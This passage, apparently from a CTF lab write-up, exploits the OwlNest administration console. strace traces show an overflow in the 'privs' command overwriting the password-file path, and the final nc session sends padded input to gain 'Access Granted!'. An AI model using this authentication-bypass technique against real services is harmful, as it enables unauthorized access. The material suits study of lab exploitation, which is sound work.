</span><span class='line'>set_thread_area<span class="o">({</span>entry_number:-1 -&gt; 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0x9428cd0<span class="o">)</span>                          <span class="o">=</span> 0x9428cd0
</span><span class='line'>brk<span class="o">(</span>0x9429000<span class="o">)</span>                          <span class="o">=</span> 0x9429000
</span><span class='line'>fstat64<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb775e000
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        (\\___/)   (\\___/)   (\\__&quot;</span>..., <span class="m">67</span>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        /0\\ /0\\   /o\\ /o\\   /0\\ &quot;</span>..., <span class="m">67</span>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">67</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       /|:. .:|\\ /|;, ,;|\\ /|:. &quot;</span>..., <span class="m">68</span>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       \\\\:::::// \\\\;;;;;// \\\\:::&quot;</span>..., <span class="m">68</span>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;   -----`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; &quot;</span>..., <span class="m">70</span>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 70
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">69</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 69
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;This is the OwlNest Administrati&quot;</span>..., 46This is the OwlNest Administration console
</span><span class='line'>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 46
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Type Help for a list of availabl&quot;</span>..., 47Type Help <span class="k">for</span> a list of available commands.
</span><span class='line'>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 47
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'>fstat64<span class="o">(</span>0, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb775d000
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, username root
</span><span class='line'><span class="s2">&quot;username root\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'><span class="s2">&quot;privs AAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>..., 1024<span class="o">)</span> <span class="o">=</span> 96
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, password hello
</span><span class='line'><span class="s2">&quot;password hello\n&quot;</span>, 1024<span class="o">)</span>       <span class="o">=</span> 15
</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA &quot;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/root/password.txt&quot;</span>, O_RDONLY<span class="o">)</span>    <span class="o">=</span> 3
</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb775c000
</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>_llseek<span class="o">(</span>3, 0, <span class="o">[</span>0<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
</span><span class='line'><span class="nb">read</span><span class="o">(</span>3, <span class="s2">&quot;cunt\n&quot;</span>, 5<span class="o">)</span>                    <span class="o">=</span> 5
</span><span class='line'>_llseek<span class="o">(</span>3, 5, <span class="o">[</span>5<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
</span><span class='line'>close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> 0
</span><span class='line'>munmap<span class="o">(</span>0xb775c000, 4096<span class="o">)</span>                <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, ^C &lt;unfinished ...&gt;
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>However, by pure chance, in this particular attempt, I tried to overflow the privs command, and as you can see, it seems the application is attempting to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA before the password file. Can we use this to make the application open a file containing a password we control ? Yes, yes we can&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# strace ./adminconsole
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./adminconsole&quot;</span>, <span class="o">[</span><span class="s2">&quot;./adminconsole&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">19</span> vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;pwk&quot;</span>, ...<span class="o">})</span>   <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x84b0000
</span><span class='line'>brk<span class="o">(</span>0x84b0cd0<span class="o">)</span>                          <span class="o">=</span> 0x84b0cd0
</span><span class='line'>set_thread_area<span class="o">({</span>entry_number:-1 -&gt; 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0x84d1cd0<span class="o">)</span>                          <span class="o">=</span> 0x84d1cd0
</span><span class='line'>brk<span class="o">(</span>0x84d2000<span class="o">)</span>                          <span class="o">=</span> 0x84d2000
</span><span class='line'>fstat64<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7717000
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        (\\___/)   (\\___/)   (\\__&quot;</span>..., <span class="m">67</span>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        /0\\ /0\\   /o\\ /o\\   /0\\ &quot;</span>..., <span class="m">67</span>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">67</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 67
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       /|:. .:|\\ /|;, ,;|\\ /|:. &quot;</span>..., <span class="m">68</span>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;       \\\\:::::// \\\\;;;;;// \\\\:::&quot;</span>..., <span class="m">68</span>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 68
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;   -----`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; \&quot;\&quot;`---`\&quot;\&quot; &quot;</span>..., <span class="m">70</span>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 70
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;        \\__V__/   \\__V__/   \\__V&quot;</span>..., <span class="m">69</span>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 69
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;This is the OwlNest Administrati&quot;</span>..., 46This is the OwlNest Administration console
</span><span class='line'>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 46
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Type Help for a list of availabl&quot;</span>..., 47Type Help <span class="k">for</span> a list of available commands.
</span><span class='line'>
</span><span class='line'><span class="o">)</span> <span class="o">=</span> 47
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'>fstat64<span class="o">(</span>0, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR<span class="p">|</span>0600, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 0<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7716000
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, username root
</span><span class='line'><span class="s2">&quot;username root\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, privs /home/meh/password.txt
</span><span class='line'><span class="s2">&quot;privs /home/meh/password.txt\n&quot;</span>, 1024<span class="o">)</span> <span class="o">=</span> 29
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, password arse
</span><span class='line'><span class="s2">&quot;password arse\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;rd.txt&quot;</span>, O_RDONLY<span class="o">)</span>                <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/root/password.txt&quot;</span>, O_RDONLY<span class="o">)</span>    <span class="o">=</span> 3
</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7715000
</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>_llseek<span class="o">(</span>3, 0, <span class="o">[</span>0<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
</span><span class='line'><span class="nb">read</span><span class="o">(</span>3, <span class="s2">&quot;blah\n&quot;</span>, 5<span class="o">)</span>                    <span class="o">=</span> 5
</span><span class='line'>_llseek<span class="o">(</span>3, 5, <span class="o">[</span>5<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
</span><span class='line'>close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> 0
</span><span class='line'>munmap<span class="o">(</span>0xb7715000, 4096<span class="o">)</span>                <span class="o">=</span> 0
</span></code></pre></td></tr></table></div></figure>


<p>As you can see here, it&rsquo;s cut off the first 16 characters of our priv input, and is trying to open &ldquo;rd.txt&rdquo;, which doesn&rsquo;t exist. Therefore we have to pad the privs input by 16 characters.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, username root
</span><span class='line'><span class="s2">&quot;username root\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
</span><span class='line'><span class="s2">&quot;privs AAAAAAAAAAAAAAAA/home/meh/&quot;</span>..., 1024<span class="o">)</span> <span class="o">=</span> 45
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, password bleh
</span><span class='line'><span class="s2">&quot;password bleh\n&quot;</span>, 1024<span class="o">)</span>        <span class="o">=</span> 14
</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/home/meh/password.txt&quot;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
</span><span class='line'>open<span class="o">(</span><span class="s2">&quot;/root/password.txt&quot;</span>, O_RDONLY<span class="o">)</span>    <span class="o">=</span> 3
</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>mmap2<span class="o">(</span>NULL, 4096, PROT_READ<span class="p">|</span>PROT_WRITE, MAP_PRIVATE<span class="p">|</span>MAP_ANONYMOUS, -1, 0<span class="o">)</span> <span class="o">=</span> 0xb7715000
</span><span class='line'>fstat64<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0644, <span class="nv">st_size</span><span class="o">=</span>5, ...<span class="o">})</span> <span class="o">=</span> 0
</span><span class='line'>_llseek<span class="o">(</span>3, 0, <span class="o">[</span>0<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
</span><span class='line'><span class="nb">read</span><span class="o">(</span>3, <span class="s2">&quot;cunt\n&quot;</span>, 5<span class="o">)</span>                    <span class="o">=</span> 5
</span><span class='line'>_llseek<span class="o">(</span>3, 5, <span class="o">[</span>5<span class="o">]</span>, SEEK_SET<span class="o">)</span>            <span class="o">=</span> 0
</span><span class='line'>close<span class="o">(</span>3<span class="o">)</span>                                <span class="o">=</span> 0
</span><span class='line'>munmap<span class="o">(</span>0xb7715000, 4096<span class="o">)</span>                <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Ready: &quot;</span>, 7Ready: <span class="o">)</span>                  <span class="o">=</span> 7
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0,
</span></code></pre></td></tr></table></div></figure>


<p>So, all we need to do now, is write a file to /home/rmp containing a password, and make the application read it instead of /root/password.txt.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 172.16.56.140 31337
</span><span class='line'>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
</span><span class='line'>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
</span><span class='line'>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
</span><span class='line'>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'>
</span><span class='line'>This is the OwlNest Administration console
</span><span class='line'>
</span><span class='line'>Type Help <span class="k">for</span> a list of available commands.
</span><span class='line'>
</span><span class='line'>Ready: username root
</span><span class='line'>Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
</span><span class='line'>Ready: password password
</span><span class='line'>Ready: login
</span><span class='line'>Access Granted!
